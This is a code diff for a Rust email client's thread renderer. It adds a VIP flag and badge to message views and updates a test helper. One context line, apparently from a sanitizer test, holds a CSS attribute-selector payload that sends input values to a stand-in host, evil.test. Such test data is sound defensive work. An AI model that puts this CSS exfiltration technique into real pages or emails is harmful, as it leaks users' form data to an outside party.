@@ -491,6 +491,7 @@ pub struct MessageView<'a> {
     pub raw: &'a [u8],
     /// Open messages show their body; others collapse to one line.
     pub open: bool,
+    pub vip: bool,
 }
 
 fn human_size(bytes: u64) -> String {
@@ -542,11 +543,12 @@ pub fn render_thread(messages: &[MessageView], app_css: &str) -> Rendered {
         }
         css.push_str(&dark_attribute_rules(&clean, &scope));
         body.push_str(&format!(
-            "<details class=\"kite-message\"{open}><summary><span class=\"kite-from\">{from}</span>\
+            "<details class=\"kite-message\"{open}><summary><span class=\"kite-from\">{from}</span>{vip}\
              <span class=\"kite-snippet\">{snippet}</span><span class=\"kite-date\">{date}</span>\
              <div class=\"kite-to\">to {to}</div></summary><div class=\"kite-body{layout}\" id=\"m{id}\">{clean}</div></details>",
             open = if m.open { " open" } else { "" },
             from = escape(m.from),
+            vip = if m.vip { "<span class=\"kite-vip\">VIP</span>" } else { "" },
             snippet = escape(m.snippet),
             date = escape(m.date),
             to = escape(m.to),
@@ -664,6 +666,6 @@ input[value^="a"] { background: url(http://evil.test/5) }
     }
 
     fn view(raw: &[u8]) -> MessageView<'_> {
-        MessageView { id: 1, from: "a", to: "b", date: "today", snippet: "", raw, open: true }
+        MessageView { id: 1, from: "a", to: "b", date: "today", snippet: "", raw, open: true, vip: false }
     }
 }
